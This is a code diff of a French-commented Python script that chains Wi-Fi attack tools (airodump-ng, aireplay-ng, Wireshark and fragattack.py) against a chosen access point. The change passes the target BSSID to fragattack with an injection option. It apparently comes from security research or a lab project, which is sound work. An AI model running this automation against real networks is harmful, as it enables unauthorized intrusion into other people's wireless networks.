@@ -33,7 +33,7 @@ def lancer_wireshark_capture():
     command_wireshark = ['wireshark', 'captureDatagramme-01.cap']
     subprocess.Popen(command_wireshark)
 
-def lancer_fragattack():
+def lancer_fragattack(bssid):
     n = 1  # Nombre de niveaux à remonter à partir du répertoire courant
     current_directory = os.getcwd()
     parent_directory = current_directory
@@ -59,10 +59,11 @@ def lancer_fragattack():
             if os.path.isfile(build_sh_path):
                 print(f"Exécution de fragattack dans {research_dir}")
                 os.chdir(research_dir)
-                command_fragattack = ['python', 'fragattack.py', fileWireshark_dir+'/captureDatagramme-01.cap']
+                command_fragattack = ['python', 'fragattack.py', '--inject', '1', '--ap', bssid, 'iface0', os.path.join(fileWireshark_dir, 'captureDatagramme-01.cap')]
                 print("Commande fragattack :", " ".join(command_fragattack))
                 subprocess.Popen(command_fragattack)
                 break
+
 
 # Vérification de l'existence de la base de données
 db_file = 'database.json'
@@ -145,7 +146,7 @@ if results:
     process_airodump = Process(target=lancer_airodump_ng, args=(channel, bssid))
     process_aireplay = Process(target=lancer_aireplay_ng, args=(bssid,))
     process_wireshark = Process(target=lancer_wireshark_capture)
-    process_fragattack = Process(target=lancer_fragattack)
+    process_fragattack = Process(target=lancer_fragattack, args=(bssid,))
 
     # Démarrage des processus
     process_airodump.start()
